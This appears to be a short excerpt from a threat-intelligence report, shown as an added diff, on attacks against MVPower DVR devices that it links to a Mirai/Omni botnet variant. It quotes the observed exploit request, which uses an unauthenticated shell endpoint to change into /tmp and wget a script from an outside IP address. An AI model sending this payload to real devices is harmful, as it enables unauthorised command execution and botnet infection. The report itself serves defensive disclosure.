@@ -1,0 +1,5 @@
+
+They are attacking ports 5500, 5501, 5502, 5050 and 60001 with a simple command of “GET /shell?cd%20/tmp;%20wget%20http://45(.)13.58.4/TPJ.sh;”.
+The initial attacks started on port 60001, before progressing into additional ports.
+This attack leverages the MVPower DVR Shell Unauthenticated Command Execution , reported by Unit 42 as part of the Omni Botnet variant of Mirai .
+What is interesting about this attacker is Juniper Threat Labs has not witnessed them using any additional exploits, perhaps showing again the attackers immaturity in the attack methodology.
